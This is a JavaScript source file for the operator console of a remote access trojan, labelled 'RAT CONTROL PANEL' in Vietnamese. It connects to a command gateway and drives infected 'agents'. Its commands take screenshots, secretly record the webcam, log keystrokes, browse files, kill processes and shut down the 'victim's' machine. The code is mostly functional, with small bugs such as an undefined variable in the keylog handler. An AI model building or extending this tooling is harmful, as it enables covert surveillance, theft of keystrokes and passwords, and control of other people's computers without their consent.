import { CONFIG } from './modules/config.js';
import { Gateway } from './modules/gateway.js';
import { GatewayDiscovery } from './modules/discovery.js';
import * as Logic from './logic.js';

const appState = {
    isConnected: false,
    sessionId: null,
    agents: [],
    currentTarget: 'ALL'
};

const ui = {
    log: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #00ff00; font-family: monospace;'),
    error: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ff0000; font-weight: bold;'),
    warn: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ffff00;'),
    info: (msg) => console.log(`%c${msg}`, 'color: cyan; font-weight: bold;'),
    updateAgentList: (agents) => {
        console.group("=== DANH SÁCH AGENT ONLINE ===");
        console.table(agents);
        console.groupEnd();
    },
    renderList: (title, data) => {
        console.group(`=== ${title} ===`);
        console.table(data);
        console.groupEnd();
    },
    renderFileList: (path, files, count) => {
        console.group(`%c=== FILE LIST: ${path} (${count} items) ===`, 'color: #3b82f6; font-weight: bold;');
        if (files && files.length > 0) {
            console.table(files.map(f => ({
                Name: f.name,
                Type: f.type,
                Size: f.size > 0 ? `${(f.size / 1024).toFixed(2)} KB` : '-',
                Modified: f.modified || '-',
                Permissions: f.permissions || '-',
                'Is Dir': f.isDirectory ? '📁' : '📄'
            })));
            
            console.log('%cNavigation:', 'color: #22c55e; font-weight: bold;');
            console.log('  - listFiles("path/to/folder") - List files in folder');
            console.log('  - listFiles("..") - Go to parent directory');
            console.log('  - Click on directory name to navigate');
        } else {
            console.log('%cEmpty directory or access denied', 'color: #ef4444;');
        }
        console.groupEnd();
    }
};

function showLoginForm() {
    if (autoConnectState.isAutoAuthenticating || gateway.isAuthenticated) {
        return;
    }
    const overlay = document.getElementById('login-overlay');
    if (overlay) {
        overlay.classList.remove('hidden');
        const passwordInput = document.getElementById('password-input');
        if (passwordInput) {
            setTimeout(() => passwordInput.focus(), 100);
        }
    }
}

function hideLoginForm() {
    const overlay = document.getElementById('login-overlay');
    if (overlay) {
        overlay.classList.add('hidden');
    }
}

function showLoginError(message) {
    const errorDiv = document.getElementById('login-error');
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.classList.remove('hidden');
    }
}

function hideLoginError() {
    const errorDiv = document.getElementById('login-error');
    if (errorDiv) {
        errorDiv.classList.add('hidden');
    }
}

function handleLogin() {
    const passwordInput = document.getElementById('password-input');
    const password = passwordInput ? passwordInput.value.trim() : '';
    
    if (!password) {
        showLoginError("Vui lòng nhập mật khẩu");
        return;
    }
    
    hideLoginError();
    sessionStorage.setItem('saved_password', password);
    
    if (passwordInput) {
        passwordInput.value = '';
    }
    
    if (gateway.ws && gateway.ws.readyState === WebSocket.OPEN) {
        gateway.authenticateWithPassword(password);
    } else {
        showLoginError("Chưa kết nối đến Gateway. Vui lòng đợi...");
    }
}

let autoConnectState = {
    hasTriedDiscovery: false,
    isConnecting: false,
    isAutoAuthenticating: false
};

const gateway = new Gateway({
    onConnected: () => {
        ui.log("System", "Connected to Gateway!");
        appState.isConnected = true;
        autoConnectState.isConnecting = false;
        autoConnectState.hasTriedDiscovery = false;
        if (gateway.ws && gateway.ws.url) {
            const url = new URL(gateway.ws.url);
            appState.lastConnectedHost = url.hostname;
        }
        
        hideLoginForm();
        
        const savedPassword = sessionStorage.getItem('saved_password');
        const wasAuthenticated = sessionStorage.getItem('is_authenticated') === 'true';
        
        if (savedPassword && wasAuthenticated && !gateway.isAuthenticated) {
            autoConnectState.isAutoAuthenticating = true;
            gateway.authenticateWithPassword(savedPassword);
        } else {
            showLoginForm();
        }
    },
    onDisconnected: () => {
        if (!gateway.isAuthenticated) {
            showLoginForm();
        }
        appState.isConnected = false;
        appState.agents = [];
        autoConnectState.isConnecting = false;
        autoConnectState.hasTriedDiscovery = false;
        
        const wasNavigation = gateway._lastCloseCode === 1001;
        const savedPassword = sessionStorage.getItem('saved_password');
        const wasAuthenticated = sessionStorage.getItem('is_authenticated') === 'true';
        
        if (wasNavigation && savedPassword && wasAuthenticated) {
            setTimeout(() => {
                if (!appState.isConnected && !autoConnectState.isConnecting) {
                    autoConnect();
                }
            }, 100);
        } else {
            setTimeout(() => {
                if (!appState.isConnected && !autoConnectState.isConnecting) {
                    autoConnect();
                }
            }, 3000);
        }
    },
    onAuthSuccess: () => {
        autoConnectState.isAutoAuthenticating = false;
        sessionStorage.setItem('is_authenticated', 'true');
        
        hideLoginForm();
        hideLoginError();
        ui.log("System", "Authentication successful! Refreshing agent list...");
        setTimeout(() => {
            gateway.refreshAgents();
        }, 500);
        
        if (window.location.pathname.includes('App_Menu')) {
            setTimeout(() => {
                if (window.refreshAppList) window.refreshAppList();
            }, 1000);
        }
        
        if (window.location.pathname.includes('Proc_Menu')) {
            setTimeout(() => {
                if (window.refreshProcessList) window.refreshProcessList();
            }, 1000);
        }
    },
    onAgentListUpdate: (agentList) => {
        ui.log("System", `Cập nhật danh sách Agent: ${agentList.length} thiết bị.`);
        appState.agents = agentList;
        
        if (appState.currentTarget !== 'ALL' && !agentList.find(a => a.id === appState.currentTarget)) {
            ui.warn("System", `Target ${appState.currentTarget} đã offline.`);
            appState.currentTarget = 'ALL';
            gateway.targetId = 'ALL';
        }
        
        if (appState.currentTarget === 'ALL' && agentList.length > 0) {
            const firstAgent = agentList[0];
            appState.currentTarget = firstAgent.id;
            gateway.setTarget(firstAgent.id);
            ui.log("System", `Tự động chọn agent: ${firstAgent.name || firstAgent.id}`);
        }
        
        ui.updateAgentList(agentList);
        
        if (window.fetchAndRenderAgents && typeof window.fetchAndRenderAgents === 'function') {
            if (window.resetAgentListPage && typeof window.resetAgentListPage === 'function') {
                window.resetAgentListPage();
            }
            window.fetchAndRenderAgents();
        }
    },
    onScreenshot: (base64Data, agentId) => {
        ui.log("Spy", `Nhận ảnh màn hình từ ${agentId}`);
        
        if (window.displayImagePreview && window.location.pathname.includes('screen_webcam')) {
            if (base64Data && base64Data.trim() !== '') {
                window.displayImagePreview(base64Data);
            } else {
                if (window.handleCaptureError) {
                    window.handleCaptureError('Không nhận được dữ liệu ảnh từ server');
                }
            }
        } else {
            const modal = document.getElementById('image-modal');
            const img = document.getElementById('modal-img');
            
            if (img && modal) {
                img.src = "data:image/jpeg;base64," + base64Data;
                modal.classList.remove('hidden');
                modal.style.display = 'block';
            }
        }
    },
    onCamera: (videoData, agentId) => {
        ui.log("Spy", `Nhận video từ ${agentId}`);
        
        if (window.displayVideoPreview && window.location.pathname.includes('screen_webcam')) {
            if (videoData && videoData.trim() !== '') {
                window.displayVideoPreview(videoData);
            } else {
                if (window.handleCaptureError) {
                    window.handleCaptureError('Không nhận được dữ liệu video từ server');
                }
            }
        } else {
            if (videoData && videoData.trim() !== '') {
                const link = document.createElement('a');
                link.href = "data:video/mp4;base64," + videoData;
                link.download = `cam_${agentId}_${Date.now()}.mp4`;
                link.click();
            }
        }
    },
    onKeylog: (keyData, agentId) => {
        if (window.keyloggerApp) return;
        const keylogPanel = document.getElementById('keylog-panel');
        if (keylogPanel) {
            keylogPanel.value += displayString;
            keylogPanel.scrollTop = keylogPanel.scrollHeight;
        }
    },
    onSystemInfo: (responseData, agentId) => {
        if (window.ui && typeof window.ui.renderSystemInfo === 'function') {
            window.ui.renderSystemInfo(responseData);
        }
    },
    onMessage: (msg) => {
        console.log("Raw Msg: ", msg);
    },
    onError: (err) => {
        ui.error("Main", err);
        let errorMessage = "Login failed!";

        if (err && err.message) {
            errorMessage = err.message;
        } else if (err && err.toString) {
            errorMessage = err.toString();
        }

        const isAuthError = errorMessage.toLowerCase().includes("password") || 
                       errorMessage.toLowerCase().includes("authentication") || 
                       errorMessage.toLowerCase().includes("wrong") ||
                       errorMessage.toLowerCase().includes("failed");

        if (isAuthError) {
            autoConnectState.isAutoAuthenticating = false;
            sessionStorage.removeItem('saved_password');
            sessionStorage.removeItem('is_authenticated');
            showLoginError('Incorrect password! Please try again.');
            showLoginForm();
        }
    }
});

window.ui = ui;
window.gateway = gateway;
window.CONFIG = CONFIG;
window.appState = appState;

window.help = () => {
    console.clear();
    console.log("%c=== RAT CONTROL PANEL - HƯỚNG DẪN ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 10px; border-radius: 5px; width: 100%; display: block;");
    
    console.group("%c1. KẾT NỐI & QUẢN LÝ", "color: #3b82f6");
    console.log("getAgentList()    - fetch agent list")
    console.log("auth()            - Đăng nhập (Bắt buộc sau khi connect)");
    console.log("discover()        - Tự động tìm Gateway (default gateways → mDNS)");
    console.log("setTarget('ID')   - Chọn mục tiêu cụ thể (hoặc 'ALL')");
    console.log("whoami()          - Lấy tên máy của mục tiêu");
    console.groupEnd();

    console.group("%c2. GIÁN ĐIỆP & THEO DÕI", "color: #ef4444");
    console.log("screenshot()      - Chụp ảnh màn hình");
    console.log("recordCam(s)      - Quay lén webcam (s: số giây, mặc định 5)");
    console.log("startKeylog()     - Bắt đầu nhận keylog");
    console.log("stopKeylog()      - Dừng keylog");
    console.groupEnd();

    console.group("%c3. ỨNG DỤNG & TIẾN TRÌNH", "color: #22c55e");
    console.log("listApps()        - Xem danh sách ứng dụng đã cài");
    console.log("startApp(id)      - Mở ứng dụng theo ID (lấy từ listApps)");
    console.log("stopApp(id)       - Tắt ứng dụng theo ID");
    console.log("listProcs()       - Xem danh sách tiến trình đang chạy");
    console.log("startProc(id)     - (Ít dùng) Chạy process");
    console.log("stopProc(id)      - Kill process theo PID");
    console.groupEnd();

    console.group("%c4. FILE SYSTEM", "color: #f59e0b");
    console.log("listFiles(path)   - List files trong thư mục (VD: listFiles('C:\\\\') hoặc listFiles('/home'))");
    console.log("listFiles()       - List files thư mục hiện tại (mặc định)");
    console.groupEnd();

    console.group("%c5. KHÁC", "color: #eab308");
    console.log("echo('msg')       - Gửi tin nhắn test (hiện popup/log bên agent)");
    console.log("shutdownAgent()   - Tắt máy nạn nhân");
    console.log("restartAgent()   - Tắt máy nạn nhân");
    console.log("help()            - Xem lại bảng này");
    console.log("demoFileList()    - Demo file list commands");
    console.groupEnd();
    
    return "Hãy bắt đầu bằng lệnh: connect('localhost')";
};

const discovery = new GatewayDiscovery();

async function autoConnect() {
    if (autoConnectState.isConnecting || appState.isConnected) {
        return;
    }
    
    autoConnectState.isConnecting = true;
    ui.info("[Auto] Đang tự động tìm Gateway...");
    
    try {
        let found = false;
        
        const discoveryPromise = discovery.discover((ip, port) => {
            found = true;
            ui.log("Auto", `Tìm thấy Gateway: ${ip}:${port}`);
            gateway.connect(ip, port);
        }, (progress) => {
            if (progress) {
                ui.info(`[Auto] ${progress}`);
            }
        });
        
        const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(false), 15000));
        const result = await Promise.race([discoveryPromise, timeoutPromise]);
        
        if (found || result) {
            return;
        }
        
        ui.warn("Auto", "Không tìm thấy Gateway. Đảm bảo Gateway đang chạy và Bonjour/mDNS đã được cài đặt.");
        autoConnectState.hasTriedDiscovery = true;
        autoConnectState.isConnecting = false;
    } catch (error) {
        ui.error("Auto", `Discovery error: ${error}`);
        autoConnectState.hasTriedDiscovery = true;
        autoConnectState.isConnecting = false;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const params = new URLSearchParams(window.location.search);
    const agentId = params.get('id');

    if (agentId) {
        const navLinks = document.querySelectorAll('.nav-links a');
        navLinks.forEach(link => {
            let href = link.getAttribute('href');
            if (href && !href.startsWith('#') && !href.startsWith('javascript') && !href.includes('id=')) {
                const separator = href.includes('?') ? '&' : '?';
                link.setAttribute('href', `${href}${separator}id=${agentId}`);
            }
        });
    }

    const loginForm = document.getElementById('login-form');
    const passwordInput = document.getElementById('password-input');
    
    if (loginForm) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            handleLogin();
        });
    }

    if (passwordInput) {
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleLogin();
            }
        });
        
        passwordInput.addEventListener('blur', () => {
            if (passwordInput.value.trim()) {
                handleLogin();
            }
        });
    }

    hideLoginForm();
    hideLoginError();
    
    window.help();

    const checkAndAutoAuth = () => {
        if (gateway.ws && gateway.ws.readyState === WebSocket.OPEN) {
            const savedPassword = sessionStorage.getItem('saved_password');
            const wasAuthenticated = sessionStorage.getItem('is_authenticated') === 'true';
            
            if (savedPassword && wasAuthenticated && !gateway.isAuthenticated) {
                autoConnectState.isAutoAuthenticating = true;
                gateway.authenticateWithPassword(savedPassword);
                return;
            }
        }
        autoConnect();
    };
    
    setTimeout(checkAndAutoAuth, 100);
});

window.getAgentList = () => {
    Logic.getAgentList();
}

window.auth = () => {
    if(!gateway.ws || gateway.ws.readyState !== WebSocket.OPEN) {
        ui.error("CMD", "Chưa kết nối! Hãy gọi connect('IP') trước.");
        return;
    }
    Logic.authenticate();
};

window.discover = () => {
    ui.info("[Discovery] Đang tìm Gateway...");
    discovery.discover((ip, port) => {
        ui.log("Discovery", `Tìm thấy Gateway tại: ${ip}:${port}`);
        gateway.connect(ip, port);
        setTimeout(() => gateway.authenticate(), 500);
    }, (progress) => {
        if (progress) {
            ui.info(`[Discovery] ${progress}`);
        }
    });
};

window.reconnect = () => {
    ui.info("[Main] Đang kết nối lại...");
    autoConnect();
};

window.setTarget = (agentId) => {
    appState.currentTarget = agentId;
    Logic.setTarget(agentId);
    ui.info(`[Control] Đã khóa mục tiêu: ${agentId}`);
}

window.listApps = () => Logic.fetchAppList();
window.startApp = (id) => Logic.startApp(id);
window.stopApp = (id) => Logic.stopApp(id);

window.listProcs = () => Logic.fetchProcessList();
window.startProc = (id) => Logic.startProcess(id);
window.stopProc = (id) => Logic.killProcess(id);

window.listFiles = (path = "") => {
    if (path === "") {
        path = "/";
    }
    ui.info(`[CMD] Listing files in: ${path}`);
    Logic.listFiles(path);
};

window.whoami = () => Logic.whoami();
window.echo = (text) => Logic.echo(text);
window.screenshot = () => {
    ui.info("[CMD] Chụp màn hình...");
    Logic.captureScreen();
};
window.recordCam = (duration = 5) => {
    ui.info(`[CMD] Quay webcam ${duration} giây...`);
    Logic.recordWebcam(duration);
};

window.startKeylog = () => {
    ui.info("[CMD] Bật Keylogger...");
    Logic.startKeylog(0.5);
};
window.stopKeylog = () => {
    ui.info("[CMD] Tắt Keylogger...");
    Logic.stopKeylog();
};

window.shutdownAgent = () => {
    if(confirm("CẢNH BÁO: Bạn chắc chắn muốn tắt máy mục tiêu?")) {
        Logic.shutdownAgent();
    }
}

window.restartAgent = () => {
    if (confirm("RESTART?")) {
        Logic.restartAgent();
    }
}


window.logout = () => {
    sessionStorage.removeItem('saved_password');
    sessionStorage.removeItem('is_authenticated');
    gateway.disconnect();
    showLoginForm();
    hideLoginError();
    ui.log("System", "Logged out!");
}